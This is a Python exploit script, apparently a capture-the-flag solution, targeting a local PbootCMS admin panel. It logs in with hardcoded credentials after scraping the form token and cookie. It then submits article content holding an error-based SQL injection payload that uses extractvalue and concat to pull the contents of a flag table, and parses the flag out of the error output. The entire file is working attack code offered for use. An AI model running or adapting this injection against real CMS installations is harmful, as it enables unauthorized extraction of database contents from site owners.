import re

import requests
from bs4 import BeautifulSoup


def getformCheck():
    r = requests.get("http://127.0.0.1/admin.php")
    r.encoding = 'utf-8'
    soup = BeautifulSoup(r.text, "html.parser")
    formcheck = soup.find("input", {"name": "formcheck"})['value']
    PbootSystem = r.cookies['PbootSystem']
    return formcheck, PbootSystem


def getck():
    check = getformCheck()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/71.0.3578.98 Safari/537.36',
        'Cookie': 'PbootSystem=' + check[1]
    }
    url = 'http://127.0.0.1/admin.php?p=/Index/login'
    data = {
        'username': 'check',
        'password': '12@aa4./(9Eb9AD)0)7',
        'formcheck': check[0]
    }
    r = requests.post(url, data, headers=headers)
    ck = r.cookies['PbootSystem']
    return 'PbootSystem='+ck


def senExp():
    ck = getck()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/71.0.3578.98 Safari/537.36',
        'Cookie': ck
    }
    r = requests.get("http://localhost/admin.php?p=/Content/index/mcode/2", headers=headers)
    r.encoding = 'utf-8'
    soup = BeautifulSoup(r.text, "html.parser")
    formcheck = soup.find("input", {"name": "formcheck"})['value']
    url = 'http://127.0.0.1/admin.php?p=/Content/add/mcode/2'
    data = {
            "formcheck": formcheck,
            "scode": "3",
            "title": "checkit",
            "tags": "",
            "author": "check_build",
            "source": "%E6%9C%AC%E7%AB%99",
            "ico": "",
            "upload": "",
            "pics": "",
            "upload": "",
            "subscode": "",
            "titlecolor": "%23333333",
            "subtitle": "",
            "filename": "",
            "outlink": "",
            "date": "2022-07-16+11%3A33%3A26",
            "enclosure": "",
            "upload": "",
            "keywords": "",
            "description": "",
            "status": "1",
            "content": '''testPOC' or (select extractvalue(1,concat(0x7e,(select group_concat(flag,0x7e) from 
            pbootcms.ay_aFlag)))) or ' '''
    }
    r = requests.post(url, data, headers=headers)
    return r.text
def getflag():
    flagg=senExp()
    flagg = re.findall(r'''~flag{(.+?)}~''', flagg)
    return "flag{"+flagg[0]+"}"

if __name__ == '__main__':
    print(getflag())